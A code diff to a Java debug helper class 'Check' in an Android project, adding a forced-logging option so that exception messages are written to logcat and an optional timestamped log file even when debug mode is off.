@@ -21,6 +21,7 @@ import com.android.service.file.Path;
 public final class Check {
 	private static final String TAG = "Check"; //$NON-NLS-1$
 	private static boolean enabled = Cfg.DEBUG;
+	private static boolean error;
 
 	/**
 	 * Asserts, used to verify the truth of an expression
@@ -70,17 +71,21 @@ public final class Check {
 		}
 	}
 
-	public synchronized static void log(String string) {
-		if (Cfg.DEBUG) {
+	public static void log(String string) {		
+		log(string, false);
+	}
+
+	public synchronized static void log(String string, boolean forced) {
+		if (Cfg.DEBUG || forced) {
 			Log.d("QZ", string); //$NON-NLS-1$
-			
+
 			if (Cfg.FILE) {
 				if (!Path.initialized()) {
 					return;
 				}
-				
+
 				final AutoFile file = new AutoFile(Path.logs(), Path.getCurLogfile());
-				
+
 				if (file.exists()) {
 					final DateTime date = new DateTime();
 					file.append(date.getOrderedString() + " - " + string + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -90,9 +95,9 @@ public final class Check {
 	}
 
 	public static void log(Throwable e) {
-		if (Cfg.DEBUG) {
+		if (Cfg.DEBUG || Cfg.EXCEPTION) {
 			e.printStackTrace();
-			log("Exception: " + e.toString()); //$NON-NLS-1$
+			log("Exception: " + e.toString(), true); //$NON-NLS-1$
 		}
 	}
 }
